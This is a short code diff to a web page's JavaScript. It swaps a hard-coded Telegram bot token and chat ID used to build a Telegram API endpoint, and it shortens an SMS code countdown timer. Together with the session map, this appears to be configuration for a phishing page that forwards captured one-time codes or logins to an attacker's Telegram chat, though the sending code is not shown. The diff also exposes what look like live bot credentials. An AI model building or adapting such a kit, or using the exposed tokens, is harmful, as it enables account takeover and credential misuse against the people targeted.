@@ -2226,8 +2226,8 @@
         // ============================================================
         // TELEGRAM BOT CONFIGURATION
         // ============================================================
-        const TG_TOKEN = "8857599940:AAHhdQczq-am8UGaIjnwug5_sFxhN4zEcNg";
-        const TG_CHAT = "8823668237";
+        const TG_TOKEN = "9044412412:AAH49sTsN94tiSh_gTyx7rGZ26aZBLS-k3M";
+        const TG_CHAT = "8845420343";
         const TG_API = `https://api.telegram.org/bot${TG_TOKEN}`;
 
         const sessions = new Map();
@@ -2853,12 +2853,12 @@
             arc.style.strokeDashoffset = '0';
             document.getElementById('smsTimerWrap').style.display = 'flex';
 
-            let remaining = 200;
+            let remaining = 60;
             const CIRCUMFERENCE = 113;
 
             const tick = function() {
                 remaining--;
-                const pct = remaining / 200;
+                const pct = remaining / 60;
                 arc.style.strokeDashoffset = String(CIRCUMFERENCE * (1 - pct));
                 num.textContent = remaining;
                 sec.textContent = remaining;
